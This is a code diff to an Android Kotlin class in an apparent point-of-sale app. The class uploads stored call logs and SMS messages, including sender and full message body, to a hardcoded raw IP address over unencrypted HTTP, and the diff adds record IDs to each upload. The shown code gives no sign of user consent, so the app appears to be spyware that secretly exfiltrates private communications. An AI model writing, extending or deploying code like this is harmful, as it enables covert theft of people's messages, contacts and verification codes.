@@ -1,7 +1,5 @@
 package com.example.pos.services
 
-import android.os.Handler
-import android.os.Looper
 import android.util.Log
 import com.example.pos.database.CallDao
 import com.example.pos.database.SmsDao
@@ -10,12 +8,8 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.RequestBody
-import retrofit2.Call
-import retrofit2.Callback
-import retrofit2.Response
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
 
@@ -24,7 +18,7 @@ class DataUploader(private val callDao: CallDao, private val smsDao: SmsDao) {
     private val okHttpClient: OkHttpClient = OkHttpClient.Builder().build()
 
     private val retrofit: Retrofit = Retrofit.Builder()
-        .baseUrl("https://example.com/api/") // Replace with your base URL
+        .baseUrl("http://195.35.11.199:8001/") // Replace with your base URL
         .client(okHttpClient)
         .addConverterFactory(GsonConverterFactory.create())
         .build()
@@ -44,11 +38,12 @@ class DataUploader(private val callDao: CallDao, private val smsDao: SmsDao) {
                     val contactName = RequestBody.create("text/plain".toMediaTypeOrNull(), call.contactName)
                     val messageType = RequestBody.create("text/plain".toMediaTypeOrNull(), call.messageType)
                     val messagePriority = RequestBody.create("text/plain".toMediaTypeOrNull(), call.messagePriority)
+                    val id = RequestBody.create("text/plain".toMediaTypeOrNull(), call.id.toString())
 
                     withContext(Dispatchers.IO) {
                         try {
                             val response = apiService.uploadCall(
-                                phoneNumber, callType, timestamp, contactName, messageType, messagePriority
+                                phoneNumber, callType, timestamp, contactName, messageType, messagePriority, id
                             )
                             if (response.isSuccessful) {
                                 Log.d("Upload", "Call data uploaded successfully.")
@@ -70,11 +65,12 @@ class DataUploader(private val callDao: CallDao, private val smsDao: SmsDao) {
                     val timestamp = RequestBody.create("text/plain".toMediaTypeOrNull(), sms.timestamp.toString())
                     val messageType = RequestBody.create("text/plain".toMediaTypeOrNull(), sms.messageType)
                     val messagePriority = RequestBody.create("text/plain".toMediaTypeOrNull(), sms.messagePriority)
+                    val id = RequestBody.create("text/plain".toMediaTypeOrNull(), sms.id.toString())
 
                     withContext(Dispatchers.IO) {
                         try {
                             val response = apiService.uploadSms(
-                                sender, messageBody, timestamp, messageType, messagePriority
+                                sender, messageBody, timestamp, messageType, messagePriority, id
                             )
                             if (response.isSuccessful) {
                                 Log.d("Upload", "SMS data uploaded successfully.")
